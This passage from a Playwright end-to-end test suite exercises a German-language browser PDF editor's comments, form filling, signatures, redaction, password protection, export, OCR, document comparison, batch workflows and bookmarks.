    await page.getByRole('textbox', { name: 'Kommentartext' }).fill('Grüße aus dem Textfeld');
    await tool(page, 'Stempel').click();
    await sheet(page).click({ position: { x: 300, y: 500 } });
    await expect(page.locator('.annot-layer image')).toHaveCount(1);
    expect((await save(page))[0]).toEqual([
      { type: 'FreeText', contents: 'Grüße aus dem Textfeld' },
      { type: 'Stamp', contents: '' },
    ]);
  });

  test('undoes and redoes a comment together with the other changes', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'Hallo' }]));
    await tool(page, 'Notiz').click();
    await sheet(page).click({ position: { x: 200, y: 120 } });
    await expect(panelButton(page)).toHaveText('Kommentare (1)');
    await page.getByRole('button', { name: 'Rückgängig' }).click();
    await expect(panelButton(page)).toHaveText('Kommentare (0)');
    await page.getByRole('button', { name: 'Wiederholen' }).click();
    await expect(panelButton(page)).toHaveText('Kommentare (1)');
  });

  test('deletes a new comment with the Delete key', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'Hallo' }]));
    await tool(page, 'Rechteck').click();
    await drag(page, [100, 200], [300, 300]);
    await expect(panelButton(page)).toHaveText('Kommentare (1)');
    await page.keyboard.press('Delete');
    await expect(panelButton(page)).toHaveText('Kommentare (0)');
    expect(await save(page)).toEqual([[]]);
  });

  test('shows the comments that are already in a file and can delete them', async ({ app: page }) => {
    await openOne(page, await makeCommentedPdf());
    await panelButton(page).click();
    await expect(page.locator('.comment-item')).toHaveCount(1);
    await expect(page.locator('.comment-text')).toHaveText('Alter Kommentar');
    await expect(page.locator('.comment-author')).toHaveText('von Erika');
    await expect(panelButton(page)).toHaveText('Kommentare (1)');
    await page.getByLabel('Kommentarliste').getByRole('button', { name: 'Löschen' }).click();
    await expect(page.locator('.comment-item')).toHaveCount(0);
    await expect(panelButton(page)).toHaveText('Kommentare (0)');
    expect(await save(page)).toEqual([[]]);
  });

  test('keeps the comments of a file when saving without changes', async ({ app: page }) => {
    await openOne(page, await makeCommentedPdf());
    expect(await save(page)).toEqual([[{ type: 'Text', contents: 'Alter Kommentar' }]]);
  });
});

test.describe('forms and signatures', () => {
  const sheet = (page: Page) => page.locator('.read-page').first();
  const tool = (page: Page, name: string) => page.getByRole('button', { name, exact: true });
  const panelButton = (page: Page) => page.getByRole('button', { name: /^Kommentare \(/ });

  async function openOne(page: Page, bytes: Uint8Array) {
    await page.getByTestId('file-input').setInputFiles(pdfFile('formular.pdf', bytes));
    await expect(page.locator('.card img')).toHaveCount(1);
    await page.getByRole('button', { name: 'Lesen', exact: true }).click();
    await expect(page.locator('.read-page img')).toBeVisible();
  }

  async function download(page: Page) {
    const file = page.waitForEvent('download');
    await page.getByRole('button', { name: 'PDF speichern' }).click();
    return downloadBytes(await file);
  }

  async function fillForm(page: Page) {
    await page.getByRole('textbox', { name: 'name' }).fill('Erika Müller');
    await page.getByRole('textbox', { name: 'name' }).blur();
    await page.getByRole('checkbox', { name: 'agree' }).click();
    await page.getByRole('radio', { name: 'colour' }).nth(1).click();
    await page.getByRole('combobox', { name: 'country' }).selectOption('Österreich');
  }

  test('fills in the fields of a form and saves the values', async ({ app: page }) => {
    await openOne(page, await makeFormPdf());
    await expect(page.getByRole('textbox', { name: 'name' })).toBeVisible();
    await fillForm(page);
    await expect(page.getByRole('radio', { name: 'colour' }).nth(1)).toHaveAttribute('aria-checked', 'true');
    // Choosing another radio button clears the first.
    await page.getByRole('radio', { name: 'colour' }).nth(2).click();
    await expect(page.getByRole('radio', { name: 'colour' }).nth(1)).toHaveAttribute('aria-checked', 'false');
    expect(await formValues(await download(page))).toEqual({ name: 'Erika Müller', agree: true, colour: 'blue', country: 'Österreich', fields: 4 });
  });

  test('undoes and redoes typed values', async ({ app: page }) => {
    await openOne(page, await makeFormPdf());
    await fillForm(page);
    const name = page.getByRole('textbox', { name: 'name' });
    for (let i = 0; i < 4; i++) await page.getByRole('button', { name: 'Rückgängig' }).click();
    await expect(name).toHaveValue('');
    await expect(page.getByRole('checkbox', { name: 'agree' })).toHaveAttribute('aria-checked', 'false');
    await page.getByRole('button', { name: 'Wiederholen' }).click();
    await expect(name).toHaveValue('Erika Müller');
  });

  test('flattens the form on request', async ({ app: page }) => {
    await openOne(page, await makeFormPdf());
    await fillForm(page);
    await page.getByLabel('Formular glätten').check();
    const bytes = await download(page);
    expect(await fieldCount(bytes)).toBe(0);
  });

  test('places a date and a check mark', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'Hallo' }]));
    await tool(page, 'Datum').click();
    await sheet(page).click({ position: { x: 100, y: 150 } });
    await tool(page, 'Häkchen').click();
    await sheet(page).click({ position: { x: 300, y: 150 } });
    await expect(panelButton(page)).toHaveText('Kommentare (2)');
    await panelButton(page).click();
    await expect(page.locator('.comment-head').filter({ hasText: 'Datum' })).toBeVisible();
    await expect(page.locator('.comment-head').filter({ hasText: 'Häkchen' })).toBeVisible();
    const found = (await annotationsOf(await download(page)))[0];
    expect(found.map((a) => a.type)).toEqual(['FreeText', 'Stamp']);
    expect(found[0].contents).toMatch(/^\d{2}\.\d{2}\.\d{4}$/);
  });

  test('signs with a typed name and remembers it for next time', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'Hallo' }]));
    await tool(page, 'Unterschrift').click();
    await page.getByRole('tab', { name: 'Tippen' }).click();
    await page.getByRole('textbox', { name: 'Name' }).fill('Erika Muster');
    await page.getByLabel('In diesem Browser merken').check();
    await page.getByRole('button', { name: 'Übernehmen' }).click();
    await sheet(page).click({ position: { x: 300, y: 250 } });
    await expect(page.locator('.annot-layer image')).toHaveCount(1);
    expect((await annotationsOf(await download(page)))[0].map((a) => a.type)).toEqual(['Stamp']);

    await tool(page, 'Unterschrift').click();
    await expect(page.getByRole('tab', { name: 'Gespeichert' })).toHaveAttribute('aria-selected', 'true');
    await expect(page.getByRole('img', { name: 'Gespeicherte Unterschrift' })).toBeVisible();
    await page.getByRole('button', { name: 'Übernehmen' }).click();
    await sheet(page).click({ position: { x: 300, y: 350 } });
    await expect(page.locator('.annot-layer image')).toHaveCount(2);
  });

  test('signs by drawing', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'Hallo' }]));
    await tool(page, 'Kürzel').click();
    await page.getByRole('button', { name: 'Übernehmen' }).click();
    await expect(page.getByRole('alert')).toHaveText('Es gibt noch nichts zu übernehmen.');
    const canvas = page.getByLabel('Fläche zum Unterschreiben mit Maus oder Finger');
    const box = (await canvas.boundingBox())!;
    await page.mouse.move(box.x + 40, box.y + 100);
    await page.mouse.down();
    await page.mouse.move(box.x + 120, box.y + 40, { steps: 5 });
    await page.mouse.move(box.x + 200, box.y + 110, { steps: 5 });
    await page.mouse.up();
    await page.getByRole('button', { name: 'Übernehmen' }).click();
    await sheet(page).click({ position: { x: 300, y: 250 } });
    await expect(page.locator('.annot-layer image')).toHaveCount(1);
  });
});

test.describe('inserting and page tools', () => {
  const sheet = (page: Page) => page.locator('.read-page').first();
  const tool = (page: Page, name: string) => page.getByRole('button', { name, exact: true });

  async function openOne(page: Page, bytes: Uint8Array, view: 'Lesen' | 'Seiten' = 'Lesen') {
    await page.getByTestId('file-input').setInputFiles(pdfFile('doc.pdf', bytes));
    await expect(page.locator('.card img').first()).toBeVisible();
    if (view === 'Lesen') {
      await page.getByRole('button', { name: 'Lesen', exact: true }).click();
      await expect(page.locator('.read-page img').first()).toBeVisible();
    }
  }

  async function download(page: Page) {
    const file = page.waitForEvent('download');
    await page.getByRole('button', { name: 'PDF speichern' }).click();
    return downloadBytes(await file);
  }

  async function drag(page: Page, from: [number, number], to: [number, number]) {
    const box = (await sheet(page).boundingBox())!;
    await page.mouse.move(box.x + from[0], box.y + from[1]);
    await page.mouse.down();
    await page.mouse.move(box.x + to[0], box.y + to[1], { steps: 6 });
    await page.mouse.up();
  }

  test('inserts text with umlauts into the page itself', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'Hallo' }]));
    await tool(page, 'Text einfügen').click();
    await drag(page, [100, 200], [400, 260]);
    await page.getByRole('button', { name: /^Kommentare \(/ }).click();
    const field = page.getByRole('textbox', { name: 'Kommentartext' });
    await field.fill('Größe 5 € für Müller');
    await field.blur();
    await expect(page.locator('.annot-text')).toHaveText('Größe 5 € für Müller');
    const bytes = await download(page);
    expect((await textOf(bytes))[0]).toContain('Größe 5 € für Müller');
    // It is page content now, not a comment.
    expect((await annotationsOf(bytes))[0]).toEqual([]);
  });

  test('warns about characters the font does not have', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'Hallo' }]));
    await tool(page, 'Text einfügen').click();
    await sheet(page).click({ position: { x: 150, y: 200 } });
    await page.getByRole('button', { name: /^Kommentare \(/ }).click();
    await page.getByRole('textbox', { name: 'Kommentartext' }).fill('日本');
    await expect(page.getByRole('status')).toContainText('日 本');
  });

  test('inserts a picture and a link', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'Hallo' }]));
    await tool(page, 'Bild einfügen').click();
    await page.getByTestId('picture-input').setInputFiles({ name: 'rot.png', mimeType: 'image/png', buffer: tinyPng() });
    await expect(tool(page, 'Bild einfügen')).toHaveAttribute('aria-pressed', 'true');
    await sheet(page).click({ position: { x: 150, y: 200 } });
    await expect(page.locator('.annot-layer image')).toHaveCount(1);
    await tool(page, 'Link').click();
    await drag(page, [300, 230], [450, 270]);
    await page.getByRole('button', { name: /^Kommentare \(/ }).click();
    const field = page.getByRole('textbox', { name: 'Adresse des Links' });
    await field.fill('https://example.org/');
    await field.blur();
    const bytes = await download(page);
    expect(await imageCount(bytes)).toBe(1);
    expect((await annotationsOf(bytes))[0].map((a) => a.type)).toEqual(['Link']);
  });

  test('numbers the pages and puts a watermark on them', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'A1' }, { width: 595, label: 'A2' }]), 'Seiten');
    await page.getByRole('button', { name: 'Kopf- und Fußzeile, Wasserzeichen' }).first().click();
    await expect(page.getByText('Gilt für alle 2 Seiten.')).toBeVisible();
    await page.getByRole('button', { name: 'Hinzufügen' }).click();
    await page.getByRole('button', { name: 'Kopf- und Fußzeile, Wasserzeichen' }).first().click();
    await page.getByLabel('Vorlage').selectOption('watermark');
    await page.getByRole('button', { name: 'Hinzufügen' }).click();
    const texts = await textOf(await download(page));
    expect(texts[0]).toContain('1 / 2');
    expect(texts[1]).toContain('2 / 2');
    expect(texts[1]).toContain('ENTWURF');
  });

  test('shows the numbers in the preview and removes a mark again', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 595, label: 'A1' }]), 'Seiten');
    await page.getByRole('button', { name: 'Kopf- und Fußzeile, Wasserzeichen' }).first().click();
    await page.getByRole('button', { name: 'Hinzufügen' }).click();
    await page.locator('.card-thumb').first().dblclick();
    await expect(page.locator('.preview-body img')).toBeVisible();
    await page.keyboard.press('Escape');
    await page.getByRole('button', { name: 'Kopf- und Fußzeile, Wasserzeichen' }).first().click();
    await expect(page.getByText('Schon vorhanden')).toBeVisible();
    await page.getByRole('dialog').getByRole('button', { name: 'Löschen' }).click();
    await expect(page.getByText('Schon vorhanden')).toHaveCount(0);
  });

  test('inserts an empty page after the selected one', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 501, label: 'A1' }, { width: 502, label: 'A2' }]), 'Seiten');
    await card(page, 0).locator('.card-thumb').click();
    await page.getByRole('button', { name: 'Leere Seite einfügen' }).click();
    await expect(cards(page)).toHaveCount(3);
    expect(await widthsAndRotations(await download(page))).toEqual(['501@0', '501@0', '502@0']);
  });

  test('crops pages and changes their size', async ({ app: page }) => {
    await openOne(page, await makePdf([{ width: 300, height: 400 }]), 'Seiten');
    await page.getByRole('button', { name: 'Zuschneiden' }).click();
    await page.getByRole('button', { name: 'Zuschneiden' }).last().click();
    // 10 mm = 28.35 pt cut from each side.
    expect(await widthsAndRotations(await download(page))).toEqual(['243@0']);
    await page.getByRole('button', { name: 'Seitengröße' }).click();
    await page.getByRole('button', { name: 'Anwenden' }).click();
    expect(await widthsAndRotations(await download(page))).toEqual(['595@0']);
  });
});

test.describe('changing existing content', () => {
  const tool = (page: Page, name: string) => page.getByRole('button', { name, exact: true });

  async function openContent(page: Page) {
    await page.getByTestId('file-input').setInputFiles(pdfFile('inhalt.pdf', await makeContentPdf()));
    await expect(page.locator('.card img').first()).toBeVisible();
    await page.getByRole('button', { name: 'Lesen', exact: true }).click();
    await expect(page.locator('.read-page img').first()).toBeVisible();
  }

  async function download(page: Page) {
    const file = page.waitForEvent('download');
    await page.getByRole('button', { name: 'PDF speichern' }).click();
    return downloadBytes(await file);
  }

  test('changes a line of text and leaves the next one alone', async ({ app: page }) => {
    await openContent(page);
    await tool(page, 'Text ändern').click();
    await page.getByRole('button', { name: 'Erste Zeile' }).click();
    await page.getByRole('button', { name: /^Kommentare \(/ }).click();
    await expect(page.getByText('Vorher: Erste Zeile')).toBeVisible();
    const field = page.getByRole('textbox', { name: 'Neuer Text der Zeile' });
    await field.fill('Geänderte Zeile für Müller');
    await field.blur();
    await expect(page.locator('.edit-text')).toHaveText('Geänderte Zeile für Müller');
    const text = (await textOf(await download(page)))[0];
    expect(text).toContain('Geänderte Zeile für Müller');
    expect(text).toContain('Zweite Zeile');
    expect(text).not.toContain('Erste Zeile');
  });

  test('takes a change back', async ({ app: page }) => {
    await openContent(page);
    await tool(page, 'Text ändern').click();
    await page.getByRole('button', { name: 'Zweite Zeile' }).click();
    await page.getByRole('button', { name: /^Kommentare \(/ }).click();
    await page.getByRole('button', { name: 'Änderung zurücknehmen' }).click();
    await expect(page.locator('.edit-text')).toHaveCount(0);
    expect((await textOf(await download(page)))[0]).toContain('Zweite Zeile');
  });

  test('removes a picture and brings it back with undo', async ({ app: page }) => {
    await openContent(page);
    await tool(page, 'Bild ändern').click();
    await page.getByRole('button', { name: '#1' }).click();
    await page.getByRole('button', { name: /^Kommentare \(/ }).click();
    await expect(page.getByText('Das Bild wurde geändert.')).toBeVisible();
    await page.getByRole('button', { name: 'Entfernen' }).click();
    await expect(page.getByText('Bild entfernt')).toBeVisible();
    const bytes = await download(page);
    expect(await imageCount(bytes)).toBe(0);
    await page.getByRole('button', { name: 'Rückgängig' }).click();
    await expect(page.getByText('Das Bild wurde geändert.')).toBeVisible();
  });

  test('replaces a picture with another one', async ({ app: page }) => {
    await openContent(page);
    await tool(page, 'Bild ändern').click();
    await page.getByRole('button', { name: '#1' }).click();
    await page.getByRole('button', { name: /^Kommentare \(/ }).click();
    await page.getByTestId('replace-input').setInputFiles({ name: 'neu.png', mimeType: 'image/png', buffer: tinyPng() });
    await expect(page.locator('.edit-picture')).toBeVisible();
    expect(await imageCount(await download(page))).toBe(1);
  });
});

test.describe('protecting', () => {
  const tool = (page: Page, name: string) => page.getByRole('button', { name, exact: true });

  async function openContent(page: Page, bytes?: Uint8Array) {
    await page.getByTestId('file-input').setInputFiles(pdfFile('geheim.pdf', bytes ?? (await makeContentPdf())));
    await expect(page.locator('.card img').first()).toBeVisible();
    await page.getByRole('button', { name: 'Lesen', exact: true }).click();
    await expect(page.locator('.read-page img').first()).toBeVisible();
  }

  async function download(page: Page) {
    const file = page.waitForEvent('download');
    await page.getByRole('button', { name: 'PDF speichern' }).click();
    return downloadBytes(await file);
  }

  test('redacts the matches of a search for good', async ({ app: page }) => {
    await openContent(page);
    await page.getByRole('searchbox', { name: 'Im Dokument suchen' }).fill('Erste');
    await expect(page.locator('.search-state')).toHaveText('1 von 1');
    await tool(page, 'Treffer schwärzen').click();
    await expect(page.locator('.annot-layer rect[fill^="rgb(20"]')).toHaveCount(1);
    await page.getByRole('button', { name: /^Kommentare \(/ }).click();
    await expect(page.getByText('Wird beim Speichern endgültig entfernt', { exact: false }).first()).toBeVisible();
    const bytes = await download(page);
    const text = (await textOf(bytes))[0];
    expect(text).not.toContain('Erste');
    expect(text).toContain('Zweite Zeile');
    expect(new TextDecoder('latin1').decode(bytes)).not.toContain('Erste');
  });

  test('draws a redaction area and takes it back', async ({ app: page }) => {
    await openContent(page);
    await tool(page, 'Schwärzen').click();
    const box = (await page.locator('.read-page').first().boundingBox())!;
    await page.mouse.move(box.x + 100, box.y + 100);
    await page.mouse.down();
    await page.mouse.move(box.x + 300, box.y + 160, { steps: 5 });
    await page.mouse.up();
    await expect(page.getByRole('button', { name: /^Kommentare \(1\)/ })).toBeVisible();
    await page.getByRole('button', { name: 'Rückgängig' }).click();
    await expect(page.getByRole('button', { name: /^Kommentare \(0\)/ })).toBeVisible();
  });

  test('saves with a password to open', async ({ app: page }) => {
    await openContent(page);
    await tool(page, 'Schutz und Prüfung').click();
    await page.getByLabel('Passwort zum Öffnen', { exact: true }).fill('öffne-mich');
    await page.getByRole('button', { name: 'Übernehmen' }).click();
    const bytes = await download(page);
    expect(await passwordInfo(bytes, 'falsch')).toEqual({ asks: true, opens: false });
    expect(await passwordInfo(bytes, 'öffne-mich')).toEqual({ asks: true, opens: true });
  });

  test('refuses a password that the engine cannot carry', async ({ app: page }) => {
    await openContent(page);
    await tool(page, 'Schutz und Prüfung').click();
    await page.getByLabel('Passwort zum Öffnen', { exact: true }).fill('a,b');
    await expect(page.getByRole('alert')).toContainText('kein Komma');
    await expect(page.getByRole('button', { name: 'Übernehmen' })).toBeDisabled();
  });

  test('shows what a file carries and removes comments when asked', async ({ app: page }) => {
    await openContent(page, await makeCommentedPdf());
    await tool(page, 'Schutz und Prüfung').click();
    await page.getByRole('tab', { name: 'Vor dem Weitergeben prüfen' }).click();
    await expect(page.getByRole('dialog').getByText('geheim.pdf')).toBeVisible();
    await expect(page.getByLabel(/Alle Kommentare/)).toBeVisible();
    await expect(page.getByText('(1)')).toBeVisible();
    await page.getByLabel(/Alle Kommentare/).check();
    await page.getByRole('button', { name: 'Übernehmen' }).click();
    expect(await annotationsOf(await download(page))).toEqual([[]]);
  });
});

test.describe('pictures and export', () => {
  async function download(page: Page, name: RegExp) {
    const file = page.waitForEvent('download');
    await page.getByRole('button', { name }).click();
    return file;
  }

  test('opens a picture as a page and saves it as PDF', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles({ name: 'scan.png', mimeType: 'image/png', buffer: tinyPng() });
    await expect(page.getByRole('tab')).toHaveText(/scan\.pdf/);
    await expect(page.locator('.card img')).toBeVisible();
    const file = await download(page, /PDF speichern/);
    expect(file.suggestedFilename()).toBe('scan.pdf');
    // 8 pixels at 150 dpi are 3.84 points.
    expect((await describePdf(await downloadBytes(file))).map((p) => p.width)).toEqual([4]);
  });

  test('exports the text of the pages as plain text and Markdown', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('inhalt.pdf', await makeContentPdf()));
    await expect(page.locator('.card img')).toBeVisible();
    await page.getByRole('button', { name: 'Exportieren' }).first().click();
    await page.getByLabel('Reiner Text').check();
    const text = page.waitForEvent('download');
    await page.getByRole('dialog').getByRole('button', { name: 'Exportieren' }).click();
    const txt = await text;
    expect(txt.suggestedFilename()).toBe('inhalt.txt');
    expect(new TextDecoder().decode(await downloadBytes(txt))).toBe('Erste Zeile Zweite Zeile');

    await page.getByRole('button', { name: 'Exportieren' }).first().click();
    await page.getByLabel('Markdown').check();
    const md = page.waitForEvent('download');
    await page.getByRole('dialog').getByRole('button', { name: 'Exportieren' }).click();
    expect((await md).suggestedFilename()).toBe('inhalt.md');

    await page.getByRole('button', { name: 'Exportieren' }).first().click();
    await page.getByLabel(/^Word/).check();
    const word = page.waitForEvent('download');
    await page.getByRole('dialog').getByRole('button', { name: 'Exportieren' }).click();
    const docx = await word;
    expect(docx.suggestedFilename()).toBe('inhalt.docx');
    const parts = unzipSync(await downloadBytes(docx));
    expect(new TextDecoder().decode(parts['word/document.xml'])).toContain('Erste Zeile Zweite Zeile');
  });

  test('recognises the text of a scanned page and writes it into the saved file', async ({ app: page }) => {
    test.setTimeout(150_000);
    // A "scan": a picture with text on it, drawn in the browser.
    const base64 = await page.evaluate(() => {
      const canvas = document.createElement('canvas');
      canvas.width = 1400;
      canvas.height = 500;
      const ctx = canvas.getContext('2d')!;
      ctx.fillStyle = '#fff';
      ctx.fillRect(0, 0, 1400, 500);
      ctx.fillStyle = '#000';
      ctx.font = 'bold 130px Arial, Helvetica, sans-serif';
      ctx.fillText('Hallo Welt', 80, 200);
      ctx.fillText('Rechnung 2026', 80, 380);
      return canvas.toDataURL('image/png').split(',')[1];
    });
    await page.getByTestId('file-input').setInputFiles({ name: 'scan.png', mimeType: 'image/png', buffer: Buffer.from(base64, 'base64') });
    await expect(page.locator('.card img')).toBeVisible();
    await page.getByRole('button', { name: 'Texterkennung' }).first().click();
    await page.getByRole('dialog').getByRole('button', { name: 'Erkennen' }).click();
    await expect(page.getByRole('status')).toContainText('Wörter erkannt', { timeout: 120_000 });
    await page.getByRole('dialog').getByRole('button', { name: 'Abbrechen' }).click();
    const file = page.waitForEvent('download');
    await page.getByRole('button', { name: 'PDF speichern' }).click();
    const text = (await textOf(await downloadBytes(await file)))[0];
    expect(text).toContain('Hallo');
    expect(text).toContain('Welt');
    expect(text).toContain('2026');
  });

  test('compares two documents and shows the words that differ', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles([
      pdfFile('alt.pdf', await makePdf([{ width: 595, label: 'Vertrag' }, { width: 595, label: 'gleich' }])),
      pdfFile('neu.pdf', await makePdf([{ width: 595, label: 'Vortrag' }, { width: 595, label: 'gleich' }])),
    ]);
    await expect(page.getByRole('tab')).toHaveCount(2);
    await page.getByRole('button', { name: 'Vergleichen' }).first().click();
    await page.getByRole('dialog').getByRole('button', { name: 'Vergleichen' }).click();
    await expect(page.getByRole('status')).toHaveText('Unterschiede auf 1 von 2 Seiten.');
    await expect(page.locator('.compare-text del')).toHaveText('Vertrag');
    await expect(page.locator('.compare-text ins')).toHaveText('Vortrag');
    await page.getByLabel('Bildvergleich (dunkel ist anders)').check();
    await expect(page.locator('canvas.compare-visual')).toBeVisible();
    await page.getByLabel('Zweites Dokument').selectOption({ label: 'alt.pdf' });
    await expect(page.getByText('Wähle zwei verschiedene Dokumente.')).toBeVisible();
  });

  test('says when two documents have the same text', async ({ app: page }) => {
    const same = await makePdf([{ width: 595, label: 'gleich' }]);
    await page.getByTestId('file-input').setInputFiles([pdfFile('eins.pdf', same), pdfFile('zwei.pdf', same)]);
    await expect(page.getByRole('tab')).toHaveCount(2);
    await page.getByRole('button', { name: 'Vergleichen' }).first().click();
    await page.getByRole('dialog').getByRole('button', { name: 'Vergleichen' }).click();
    await expect(page.getByRole('status')).toHaveText('Kein Unterschied im Text.');
  });

  test('compresses a file with a large picture and shows the sizes before and after', async ({ app: page }) => {
    const photo = await makePhotoPdf();
    await page.getByTestId('file-input').setInputFiles(pdfFile('foto.pdf', photo));
    await expect(page.locator('.card img')).toBeVisible();
    await page.getByRole('button', { name: 'Komprimieren' }).first().click();
    await page.getByRole('dialog').getByRole('button', { name: 'Komprimieren' }).click();
    await expect(page.getByRole('status')).toContainText('Vorher');
    await expect(page.getByRole('status')).toContainText('nachher');
    const file = page.waitForEvent('download');
    await page.getByRole('button', { name: 'Speichern', exact: true }).click();
    const saved = await file;
    expect(saved.suggestedFilename()).toBe('foto-komprimiert.pdf');
    expect((await downloadBytes(saved)).length).toBeLessThan(photo.length / 3);
  });

  test('exports pages as pictures, a single one as PNG and several as a ZIP', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('zwei.pdf', await makePdf([{ width: 300, height: 200 }, { width: 301, height: 200 }])));
    await expect(page.locator('.card img')).toHaveCount(2);
    await page.getByRole('button', { name: 'Exportieren' }).first().click();
    const zipped = page.waitForEvent('download');
    await page.getByRole('dialog').getByRole('button', { name: 'Exportieren' }).click();
    const zipFile = await zipped;
    expect(zipFile.suggestedFilename()).toBe('zwei-Bilder.zip');
    expect(Object.keys(unzipSync(await downloadBytes(zipFile))).sort()).toEqual(['zwei-01.png', 'zwei-02.png']);

    await card(page, 0).locator('.card-thumb').click();
    await page.getByRole('button', { name: 'Exportieren' }).first().click();
    const single = page.waitForEvent('download');
    await page.getByRole('dialog').getByRole('button', { name: 'Exportieren' }).click();
    const png = await single;
    expect(png.suggestedFilename()).toBe('zwei-01.png');
    expect([...(await downloadBytes(png)).slice(0, 4)]).toEqual([0x89, 0x50, 0x4e, 0x47]);
  });
});

test.describe('workflows', () => {
  async function openBatch(page: Page) {
    await page.getByTestId('file-input').setInputFiles(pdfFile('start.pdf', await makePdf([{ width: 300 }])));
    await expect(page.locator('.card img')).toBeVisible();
    await page.getByRole('button', { name: 'Abläufe' }).first().click();
  }

  test('applies a list of steps to several files and saves them as a ZIP', async ({ app: page }) => {
    await openBatch(page);
    await page.getByLabel('Schritt hinzufügen').selectOption('mark');
    await page.getByLabel('Schritt hinzufügen').selectOption('rotate');
    await page.getByTestId('batch-input').setInputFiles([
      pdfFile('eins.pdf', await makePdf([{ width: 301, label: 'A' }, { width: 302, label: 'B' }])),
      pdfFile('zwei.pdf', await makePdf([{ width: 303, label: 'C' }])),
      { name: 'kaputt.pdf', mimeType: 'application/pdf', buffer: Buffer.from('das ist kein PDF') },
    ]);
    await expect(page.getByText('3 Dateien gewählt')).toBeVisible();
    await page.getByRole('dialog').getByRole('button', { name: 'Anwenden' }).click();
    await expect(page.locator('.batch-rows li[data-state="done"]')).toHaveCount(2, { timeout: 30_000 });
    await expect(page.locator('.batch-rows li[data-state="failed"]')).toHaveCount(1);
    const file = page.waitForEvent('download');
    await page.getByRole('button', { name: 'Ergebnis speichern' }).click();
    const zipFile = await file;
    expect(zipFile.suggestedFilename()).toBe('bearbeitete-pdfs.zip');
    const parts = unzipSync(await downloadBytes(zipFile));
    expect(Object.keys(parts).sort()).toEqual(['eins-bearbeitet.pdf', 'zwei-bearbeitet.pdf']);
    const eins = parts['eins-bearbeitet.pdf'];
    expect((await textOf(eins)).map((t) => t.includes('1 / 2') || t.includes('2 / 2'))).toEqual([true, true]);
    expect((await describePdf(eins)).map((p) => p.rotation)).toEqual([90, 90]);
  });

  test('saves a workflow without its passwords and loads it again', async ({ app: page }) => {
    await openBatch(page);
    await page.getByLabel('Schritt hinzufügen').selectOption('protect');
    await page.getByLabel('Passwort zum Öffnen', { exact: true }).fill('geheim');
    await page.getByLabel('Schritt hinzufügen').selectOption('flatten');
    await page.getByLabel('Name', { exact: true }).fill('Vertraulich');
    await page.getByRole('button', { name: 'Speichern', exact: true }).click();
    await page.keyboard.press('Escape');
    await page.getByRole('button', { name: 'Abläufe' }).first().click();
    await page.getByLabel('Gespeicherte Abläufe').selectOption('Vertraulich');
    await expect(page.getByText('Passwort und Berechtigungen', { exact: true }).first()).toBeVisible();
    await expect(page.getByText('Formular glätten', { exact: true }).first()).toBeVisible();
    await expect(page.getByLabel('Passwort zum Öffnen', { exact: true })).toHaveValue('');
    expect(await page.evaluate(() => localStorage.getItem('pdfgoat.workflows'))).not.toContain('geheim');
  });

  test('protects every file with the password typed for this run', async ({ app: page }) => {
    await openBatch(page);
    await page.getByLabel('Schritt hinzufügen').selectOption('protect');
    await page.getByLabel('Passwort zum Öffnen', { exact: true }).fill('lauf');
    await page.getByTestId('batch-input').setInputFiles(pdfFile('a.pdf', await makePdf([{ width: 301 }])));
    await page.getByRole('dialog').getByRole('button', { name: 'Anwenden' }).click();
    await expect(page.locator('.batch-rows li[data-state="done"]')).toHaveCount(1, { timeout: 30_000 });
    const file = page.waitForEvent('download');
    await page.getByRole('button', { name: 'Ergebnis speichern' }).click();
    expect(await passwordInfo(await downloadBytes(await file), 'lauf')).toEqual({ asks: true, opens: true });
  });
});

test.describe('bookmarks', () => {
  test('renames, adds and points bookmarks at other pages, and saves them', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('buch.pdf', await makeRichPdf('R', 500)));
    await expect(page.locator('.card img').first()).toBeVisible();
    await page.getByRole('button', { name: 'Lesezeichen' }).first().click();
    await expect(page.getByRole('option', { name: /R Eins/ })).toBeVisible();
    await page.getByRole('option', { name: /R Eins/ }).click();
    await page.getByLabel('Titel', { exact: true }).fill('Anfang');
    await page.getByRole('button', { name: 'Neu', exact: true }).click();
    await page.getByLabel('Titel', { exact: true }).fill('Zum Schluss');
    await page.getByLabel('Springt zu').selectOption({ label: 'Seite 3' });
    await page.getByRole('dialog').getByRole('button', { name: 'Übernehmen' }).click();
    const file = page.waitForEvent('download');
    await page.getByRole('button', { name: 'PDF speichern' }).click();
    expect(await outlineOf(await downloadBytes(await file))).toEqual([
      { title: 'Anfang', page: 0 },
      { title: 'R Drei', page: 2 },
      { title: 'Zum Schluss', page: 2 },
    ]);
  });

  test('moves with the page, shows in the reading view and can be undone and reset', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('buch.pdf', await makeRichPdf('R', 500)));
    await expect(page.locator('.card img').first()).toBeVisible();
    await page.getByRole('button', { name: 'Lesezeichen' }).first().click();
    await page.getByRole('option', { name: /R Drei/ }).click();
    await page.getByRole('button', { name: 'Löschen' }).last().click();
    await page.getByRole('dialog').getByRole('button', { name: 'Übernehmen' }).click();
    // Reading view: only the one bookmark is left.
    await page.getByRole('button', { name: 'Lesen', exact: true }).click();
    await page.getByRole('button', { name: 'Seitenleiste' }).click();
    await page.getByRole('tab', { name: 'Lesezeichen' }).click();
    await expect(page.locator('.outline').getByText('R Eins')).toBeVisible();
    await expect(page.locator('.outline').getByText('R Drei')).toHaveCount(0);
    await page.getByRole('button', { name: 'Rückgängig' }).click();
    await expect(page.locator('.outline').getByText('R Drei')).toBeVisible();
  });
});

test.describe('creating form fields', () => {
  const tool = (page: Page, name: string) => page.getByRole('button', { name, exact: true });

  async function openOne(page: Page, bytes: Uint8Array) {
